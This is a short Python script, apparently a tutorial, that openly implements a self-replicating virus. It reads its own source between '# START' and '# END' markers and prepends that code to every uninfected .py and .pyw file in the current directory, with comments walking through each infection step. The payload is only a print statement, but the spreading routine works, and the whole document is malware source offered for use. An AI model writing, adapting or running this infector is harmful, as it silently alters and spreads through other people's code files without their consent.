# START
# This module provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter.
import sys 

# The glob module finds all the pathnames matching a specified pattern according to the rules used by the Unix shell
import glob

virus_code = []

# Opens the current file and read it

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()


# This variable allows us to mark the code to be copied 
# (i.e. the code between # START and # END)
self_replicating_part = False

for line in lines:
    if line == "# START":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# END\n":
        break

# We use the glob module to get/ match all the python 
# files in the current directory. 
python_files = glob.glob('*.py') + glob.glob('*.pyw')    

# We now read each file one by one and infect it with the virus
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    # We use the variable infected to check wheter the file is already infected
    infected = False

    # We know the file is already infected if the file starts with # START
    for line in file_code:
        if line == "# START\n":
            infected = True
            break

    # If the file is not infected...
    if not infected:
        # ...we infect it by creating the new (final) code...
        final_code = []
        # ...which consists of the virus...
        final_code.extend(virus_code)
        final_code.extend('\n')
        # ...and the original file code.
        final_code.extend(file_code)
        
        # We thereby preserve the functionalitiy of the file
        # but also infect it with our virus.
        with open(file, 'w') as f:
            f.writelines(final_code)

# This is the malicious code. In a real virus this 
# would contain more malicious code.
def malicious_code():
    print("Infection succeded")

malicious_code()
# END
